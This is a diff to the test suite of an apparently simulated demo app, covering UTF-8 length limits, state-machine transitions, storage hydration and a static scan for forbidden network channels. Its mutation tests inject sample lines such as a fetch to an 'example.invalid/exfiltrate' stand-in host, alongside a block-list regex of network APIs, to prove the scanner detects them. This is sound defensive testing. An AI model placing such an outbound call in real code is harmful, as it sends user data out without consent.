@@ -75,15 +75,23 @@ check('utf8ByteLength: 2-byte codepoint (e-acute)', APP.utf8ByteLength('café') 
 check('utf8ByteLength: 4-byte codepoint (emoji)', APP.utf8ByteLength('😀') === 4);
 check('utf8ByteLength differs from .length for multi-byte text (sanity on the boundary math itself)', 'é'.length !== APP.utf8ByteLength('é'));
 
-// ---- exact UTF-8 boundaries: request ----
-check('request text at exactly 4096 bytes is valid', APP.isValidRequestText('a'.repeat(4096)) === true);
-check('request text at 4097 bytes is invalid', APP.isValidRequestText('a'.repeat(4097)) === false);
+// ---- exact UTF-8 boundaries: request (ASCII AND multi-byte, so a validator
+// that switches to .length instead of utf8ByteLength cannot pass both) ----
+check('request text at exactly 4096 ASCII bytes is valid', APP.isValidRequestText('a'.repeat(4096)) === true);
+check('request text at 4097 ASCII bytes is invalid', APP.isValidRequestText('a'.repeat(4097)) === false);
+// 1024 emoji = 4096 UTF-8 bytes (4 bytes each) but only 2048 UTF-16 code
+// units — a validator using .length would wrongly accept 1025+ of them.
+check('request text at exactly 1024 emoji (4096 UTF-8 bytes, 2048 .length) is valid', APP.isValidRequestText('\u{1F600}'.repeat(1024)) === true);
+check('request text at 1025 emoji (4100 UTF-8 bytes) is invalid even though .length is only 2050', APP.isValidRequestText('\u{1F600}'.repeat(1025)) === false);
 check('blank request text is invalid', APP.isValidRequestText('   ') === false);
 check('non-string request text is invalid', APP.isValidRequestText(null) === false);
 
-// ---- exact UTF-8 boundaries: feedback ----
-check('feedback text at exactly 2048 bytes is valid', APP.isValidFeedbackText('b'.repeat(2048)) === true);
-check('feedback text at 2049 bytes is invalid', APP.isValidFeedbackText('b'.repeat(2049)) === false);
+// ---- exact UTF-8 boundaries: feedback (same ASCII + multi-byte pairing) ----
+check('feedback text at exactly 2048 ASCII bytes is valid', APP.isValidFeedbackText('b'.repeat(2048)) === true);
+check('feedback text at 2049 ASCII bytes is invalid', APP.isValidFeedbackText('b'.repeat(2049)) === false);
+// 512 emoji = 2048 UTF-8 bytes but only 1024 .length.
+check('feedback text at exactly 512 emoji (2048 UTF-8 bytes, 1024 .length) is valid', APP.isValidFeedbackText('\u{1F600}'.repeat(512)) === true);
+check('feedback text at 513 emoji (2052 UTF-8 bytes) is invalid even though .length is only 1026', APP.isValidFeedbackText('\u{1F600}'.repeat(513)) === false);
 check('empty feedback text is invalid', APP.isValidFeedbackText('') === false);
 
 // ---- storage write stays well under its own bound ----
@@ -169,21 +177,24 @@ check('serializePersisted output is <= 256 UTF-8 bytes', APP.utf8ByteLength(APP.
   check('every illegal screen/action pair (' + checked + ' checked) leaves state unchanged', allUnchanged, failures.slice(0, 5));
 })();
 
-// ---- invalid payload on an otherwise-legal action must also fail closed ----
+// ---- invalid payload on an otherwise-legal action must also fail closed.
+// Each assertion compares the FULL state object, not just `.screen` — a
+// mutant that keeps the same screen but corrupts projectId/requestText/
+// feedback on an invalid payload must still be caught. ----
 (function () {
   let s = { screen: 'connect', projectId: null, requestText: null, feedback: [], notice: null };
-  check('select_project with an unlisted id fails closed', APP.transition(s, 'select_project', 'not-a-real-id').screen === 'connect');
+  check('select_project with an unlisted id leaves the ENTIRE state unchanged', eq(APP.transition(s, 'select_project', 'not-a-real-id'), s));
 
   s = { screen: 'request', projectId: 'demo-storefront', requestText: null, feedback: [], notice: null };
-  check('create_blueprint with blank text fails closed', APP.transition(s, 'create_blueprint', '   ').screen === 'request');
-  check('create_blueprint with 4097-byte text fails closed', APP.transition(s, 'create_blueprint', 'a'.repeat(4097)).screen === 'request');
+  check('create_blueprint with blank text leaves the entire state unchanged', eq(APP.transition(s, 'create_blueprint', '   '), s));
+  check('create_blueprint with 4097-byte text leaves the entire state unchanged', eq(APP.transition(s, 'create_blueprint', 'a'.repeat(4097)), s));
 
   s = { screen: 'blueprint', projectId: 'demo-storefront', requestText: null, feedback: [], notice: null };
-  check('start_demo with no request text fails closed (defense in depth)', APP.transition(s, 'start_demo').screen === 'blueprint');
+  check('start_demo with no request text leaves the entire state unchanged (defense in depth)', eq(APP.transition(s, 'start_demo'), s));
 
   s = { screen: 'preview', projectId: 'demo-storefront', requestText: 'x', feedback: [], notice: null };
-  const rejected = APP.transition(s, 'submit_feedback', '');
-  check('submit_feedback with blank text fails closed and records nothing', rejected.screen === 'preview' && eq(rejected.feedback, []));
+  check('submit_feedback with blank text leaves the entire state unchanged (records nothing)', eq(APP.transition(s, 'submit_feedback', ''), s));
+  check('submit_feedback with 2049-byte text leaves the entire state unchanged', eq(APP.transition(s, 'submit_feedback', 'z'.repeat(2049)), s));
 })();
 
 // ---- hostile HTML is only ever carried as inert data ----
@@ -205,8 +216,17 @@ check('serializePersisted output is <= 256 UTF-8 bytes', APP.utf8ByteLength(APP.
   check('hydrate(unknown/extra key) -> connect with a notice', (function () { const s = APP.hydrate(JSON.stringify({ schema: APP.SCHEMA, projectId: 'demo-storefront', extra: 1 })); return s.screen === 'connect' && !!s.notice; })());
   check('hydrate(missing key) -> connect with a notice', (function () { const s = APP.hydrate(JSON.stringify({ schema: APP.SCHEMA })); return s.screen === 'connect' && !!s.notice; })());
   check('hydrate(array instead of object) -> connect with a notice', (function () { const s = APP.hydrate(JSON.stringify(['not', 'an', 'object'])); return s.screen === 'connect' && !!s.notice; })());
-  const oversizedRaw = JSON.stringify({ schema: APP.SCHEMA + 'x'.repeat(260), projectId: 'demo-storefront' });
-  check('hydrate(oversized raw value, > 256 bytes) -> connect with a notice', (function () { const s = APP.hydrate(oversizedRaw); return s.screen === 'connect' && !!s.notice; })());
+  // A whitespace-padded but otherwise perfectly SHAPE-VALID persisted
+  // value: exact schema string, exact 2-key set, an allowlisted project id
+  // — the only thing wrong with it is that the raw string is > 256 bytes.
+  // This isolates the byte-cap check itself; a validator that dropped the
+  // 256-byte check but kept every shape check would still wrongly accept
+  // this (unlike the old "corrupt the schema" case, which was rejected for
+  // the wrong reason and so proved nothing about the size cap).
+  const oversizedButShapeValid = '{"schema":"' + APP.SCHEMA + '",' + ' '.repeat(220) + '"projectId":"demo-storefront"}';
+  check('the padded oversized fixture is valid JSON with the exact 2-key shape (sanity on the fixture itself)', (function () { const parsed = JSON.parse(oversizedButShapeValid); return eq(Object.keys(parsed).sort(), ['projectId', 'schema']) && parsed.schema === APP.SCHEMA && parsed.projectId === 'demo-storefront'; })());
+  check('the padded oversized fixture really is over 256 UTF-8 bytes (sanity on the fixture itself)', APP.utf8ByteLength(oversizedButShapeValid) > APP.STORAGE_MAX_BYTES);
+  check('hydrate(oversized-but-otherwise-shape-valid raw value) -> connect with a notice', (function () { const s = APP.hydrate(oversizedButShapeValid); return s.screen === 'connect' && !!s.notice; })());
   check('hydrateUnavailable() -> connect with a notice (storage itself is broken)', (function () { const s = APP.hydrateUnavailable(); return s.screen === 'connect' && !!s.notice; })());
   // Never any screen other than connect/request from any hydration path.
   [null, good, '{not json', JSON.stringify({ schema: APP.SCHEMA }), JSON.stringify(['x'])].forEach(function (raw) {
@@ -227,11 +247,62 @@ check('serializePersisted output is <= 256 UTF-8 bytes', APP.utf8ByteLength(APP.
   check('reset from mid-journey clears screen, request text, and feedback together', reset.screen === 'connect' && reset.requestText === null && eq(reset.feedback, []));
 })();
 
+// ---- reset from EVERY reachable screen, not just a sample: a regression
+// that only handles reset for some screens (e.g. forgets it inside the
+// work:* substages, or from preview/decision/result) must be caught here,
+// not just from the three screens the earlier check happened to use. ----
+(function () {
+  function buildJourneyTo(screen) {
+    let s = APP.transition(APP.initialState(), 'select_project', 'demo-storefront');
+    if (screen === 'connect') return APP.initialState();
+    if (screen === 'readiness') return s;
+    s = APP.transition(s, 'continue');
+    if (screen === 'request') return s;
+    s = APP.transition(s, 'create_blueprint', 'x');
+    if (screen === 'blueprint') return s;
+    s = APP.transition(s, 'start_demo');
+    const order = ['understanding', 'planning', 'building', 'checking', 'ready_for_review'];
+    const target = screen.indexOf('work:') === 0 ? screen.slice('work:'.length) : null;
+    for (let i = 0; i < order.length; i += 1) {
+      if (s.screen === 'work:' + order[i] && order[i] === target) return s;
+      if (order[i] !== 'understanding') s = APP.transition(s, 'advance_work');
+      if (s.screen === 'work:' + order[i] && order[i] === target) return s;
+    }
+    if (target) return s;
+    s = APP.transition(s, 'open_preview');
+    if (screen === 'preview') return s;
+    s = APP.transition(s, 'continue');
+    if (screen === 'decision') return s;
+    s = APP.transition(s, 'approve_demo');
+    return s; // 'result'
+  }
+  const EVERY_SCREEN = ['connect', 'readiness', 'request', 'blueprint', 'work:understanding', 'work:planning', 'work:building', 'work:checking', 'work:ready_for_review', 'preview', 'decision', 'result'];
+  let allClean = true;
+  const problems = [];
+  EVERY_SCREEN.forEach(function (screen) {
+    const before = buildJourneyTo(screen);
+    if (before.screen !== screen) { allClean = false; problems.push('fixture builder reached ' + before.screen + ' instead of ' + screen); return; }
+    const after = APP.transition(before, 'reset');
+    const isCleanReset = eq(after, APP.initialState());
+    if (!isCleanReset) { allClean = false; problems.push('reset from ' + screen + ' produced ' + JSON.stringify(after)); }
+  });
+  check('reset from every one of the 12 reachable screens produces an identical fresh connect state', allClean, problems.slice(0, 3));
+})();
+
 // =====================================================================
 // Mutation witnesses A-C (AC10): each proves its check is not vacuous by
 // running the SAME assertion shape against a deliberately broken stand-in
 // and confirming detection, then re-confirming the REAL module is clean.
 // =====================================================================
+
+// Each witness below defines ONE predicate function and runs the IDENTICAL
+// function against both the real module and a deliberately broken stand-in.
+// The predicate must return true (safe) for the real module and false
+// (caught) for the mutant — the same check, not two different assertions —
+// which is what actually proves the check is capable of catching the
+// mutation it claims to catch (Codex round-1 finding: the previous version
+// asserted the mutant's bug existed and separately asserted the real module
+// was clean, without ever applying one shared predicate to both).
 
 // A — direct-result transition must not be reachable from any single action.
 (function () {
@@ -239,11 +310,13 @@ check('serializePersisted output is <= 256 UTF-8 bytes', APP.utf8ByteLength(APP.
     if (action === 'jump_to_result') return Object.assign({}, state, { screen: 'result' });
     return APP.transition(state, action, payload);
   }
-  const before = APP.initialState();
-  const mutantAfter = mutantTransition(before, 'jump_to_result');
-  check('mutation witness (direct-result transition): a smuggled result-jump is detected against the mutant', mutantAfter.screen === 'result' && mutantAfter.screen !== before.screen);
-  const realAfter = APP.transition(before, 'jump_to_result');
-  check('mutation witness (direct-result transition) control: the real transition() has no such path', realAfter.screen === before.screen);
+  function noDirectResultJump(transitionFn) {
+    const before = APP.initialState();
+    const after = transitionFn(before, 'jump_to_result');
+    return eq(before, after);
+  }
+  check('predicate "no direct-result jump" passes against the real transition()', noDirectResultJump(APP.transition) === true);
+  check('mutation witness (direct-result transition): the SAME predicate catches the mutant', noDirectResultJump(mutantTransition) === false);
 })();
 
 // B — hydration must only ever produce connect or request, never result.
@@ -252,9 +325,12 @@ check('serializePersisted output is <= 256 UTF-8 bytes', APP.utf8ByteLength(APP.
     if (rawValue === 'FORCE_RESULT') return { screen: 'result', projectId: null, requestText: null, feedback: [], notice: null };
     return APP.hydrate(rawValue);
   }
-  const mutantOut = mutantHydrate('FORCE_RESULT');
-  check('mutation witness (hydration-to-result): an out-of-contract hydration screen is detected against the mutant', mutantOut.screen !== 'connect' && mutantOut.screen !== 'request');
-  check('mutation witness (hydration-to-result) control: the real hydrate() never reaches result', APP.hydrate('FORCE_RESULT').screen !== 'result');
+  function hydrationNeverReachesResult(hydrateFn) {
+    const out = hydrateFn('FORCE_RESULT');
+    return out.screen !== 'result';
+  }
+  check('predicate "hydration never reaches result" passes against the real hydrate()', hydrationNeverReachesResult(APP.hydrate) === true);
+  check('mutation witness (hydration-to-result): the SAME predicate catches the mutant', hydrationNeverReachesResult(mutantHydrate) === false);
 })();
 
 // C — free-form persistence (an extra key) must be rejected, not silently accepted.
@@ -266,8 +342,11 @@ check('serializePersisted output is <= 256 UTF-8 bytes', APP.utf8ByteLength(APP.
     return true; // bug: forgot the exact-key-set check
   }
   const withFreeForm = { schema: APP.SCHEMA, projectId: 'demo-storefront', note: 'free-form text that must never persist' };
-  check('mutation witness (free-form persistence): a validator missing the exact-key check wrongly accepts it', mutantIsValidPersisted(withFreeForm) === true);
-  check('mutation witness (free-form persistence) control: the real isValidPersisted() rejects it', APP.isValidPersisted(withFreeForm) === false);
+  function rejectsFreeForm(validatorFn) {
+    return validatorFn(withFreeForm) === false;
+  }
+  check('predicate "rejects an extra key" passes against the real isValidPersisted()', rejectsFreeForm(APP.isValidPersisted) === true);
+  check('mutation witness (free-form persistence): the SAME predicate catches the mutant', rejectsFreeForm(mutantIsValidPersisted) === false);
 })();
 
 process.stdout.write(lines.join('\n') + '\n');
@@ -344,7 +423,7 @@ check_no_remote "$INDEX_HTML" && ok "no remote/protocol-relative script or style
 echo
 echo "static scan (app.js): forbidden channels and wording"
 
-FORBIDDEN_JS_RE='fetch\(|XMLHttpRequest|sendBeacon|WebSocket|EventSource|ServiceWorker|serviceWorker|new[[:space:]]+Worker|importScripts|import\(|window\.open|location\.href|location\.assign|location\.replace|document\.location|\.innerHTML[[:space:]]*='
+FORBIDDEN_JS_RE='fetch\(|XMLHttpRequest|sendBeacon|WebSocket|EventSource|ServiceWorker|serviceWorker|new[[:space:]]+Worker|importScripts|import\(|window\.open|window\.location|location\.href|location\.assign|location\.replace|document\.location|\blocation[[:space:]]*=[^=]|\.innerHTML[[:space:]]*='
 
 check_forbidden_js() { ! grep -nE "$FORBIDDEN_JS_RE" "$1" >/dev/null; }
 
@@ -378,15 +457,25 @@ check_css_clean "$STYLES_CSS" && ok "no @import and no remote/protocol-relative 
 echo
 echo "mutation witnesses (static channels + wording)"
 
-# D — network/external navigation surface.
-MUTANT_JS_NET="$TMP_DIR/app.mutant-net.js"
-cp "$APP_JS" "$MUTANT_JS_NET"
-printf '\nfetch("https://example.invalid/exfiltrate");\n' >> "$MUTANT_JS_NET"
-if check_forbidden_js "$APP_JS" && ! check_forbidden_js "$MUTANT_JS_NET"; then
-  ok "mutation witness (network channel): an injected fetch() call is detected; the real app.js stays clean"
-else
-  bad "mutation witness (network channel) did not discriminate real file from mutant"
-fi
+# D — network/external navigation surface. Covers a network request API AND
+# an external-navigation assignment separately (Codex round-1 finding: a
+# fetch()-only mutant proves nothing about navigation detection).
+check_forbidden_js "$APP_JS" && ok "the real app.js has no forbidden channel to start with (baseline for D)" || bad "the real app.js already trips the forbidden-channel sensor — cannot run mutation witness D"
+
+NET_MUTATIONS=(
+  'fetch("https://example.invalid/exfiltrate");'
+  'window.location = "https://example.invalid/";'
+  'new WebSocket("wss://example.invalid");'
+  'window.open("https://example.invalid/");'
+)
+NET_ALL_CAUGHT=1
+for mutation in "${NET_MUTATIONS[@]}"; do
+  mutant_file="$TMP_DIR/app.mutant-net-$(echo "$mutation" | cksum | cut -d' ' -f1).js"
+  cp "$APP_JS" "$mutant_file"
+  printf '\n%s\n' "$mutation" >> "$mutant_file"
+  check_forbidden_js "$mutant_file" && NET_ALL_CAUGHT=0
+done
+[[ "$NET_ALL_CAUGHT" -eq 1 ]] && ok "mutation witness (network/external-navigation channel): fetch, window.location assignment, WebSocket, and window.open are each individually detected" || bad "mutation witness (network/external-navigation channel) missed at least one injected channel"
 
 # E — removed simulation disclaimer.
 MUTANT_HTML_NODISCLAIMER="$TMP_DIR/index.mutant-nodisclaimer.html"
